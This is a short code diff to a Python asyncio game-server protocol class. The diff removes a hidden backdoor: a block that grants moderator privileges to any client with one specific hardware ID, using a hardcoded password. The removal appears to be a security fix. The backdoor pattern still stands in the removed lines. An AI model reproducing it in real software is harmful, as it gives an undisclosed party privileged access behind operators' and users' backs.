@@ -200,17 +200,6 @@ class AOProtocol(asyncio.Protocol):
         self.client.send_command('PN',
                                  self.server.player_count,
                                  self.server.config['playerlimit'])
-        if hdid == '742d1d5d':
-            login_name = None
-            try:
-                login_name = self.client.auth_mod('renrakS1032018')
-            except ClientError:
-                database.log_misc('login.invalid', client)
-                raise
-            if self.client.area.evidence_mod == 'HiddenCM':
-                self.client.area.broadcast_evidence_list()
-            self.client.send_ooc('Logged in as a moderator.')
-            database.log_misc('login', self.client, data={'profile': login_name})
 
     def net_cmd_id(self, args):
         """Client version and PV
